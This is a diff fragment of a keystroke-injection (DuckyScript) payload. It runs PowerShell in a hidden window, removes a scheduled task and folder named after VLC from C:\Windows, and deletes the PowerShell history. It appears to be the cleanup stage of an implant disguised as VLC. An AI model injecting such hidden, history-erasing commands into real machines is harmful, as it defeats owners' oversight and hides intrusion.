@@ -14,10 +14,10 @@ REM Run payload in hidden window
 STRING Start-Process -WindowStyle Hidden PowerShell "
 REM Payload
 STRING cd C:\Windows\VLC
-STRING Stop-ScheduledTask -TaskName "VLC"
+STRING Stop-ScheduledTask -TaskName "vlc"
 STRING Unregister-ScheduledTask -TaskName VLC -Confirm:$false
 STRING attrib -s -h .
 STRING cd ..
-STRING Remove-Item -recurse -force VLC
+STRING Remove-Item -recurse -force vlc
 STRING ";(Get-PSReadlineOption).HistorySavePath | rm;exit
 ENTER
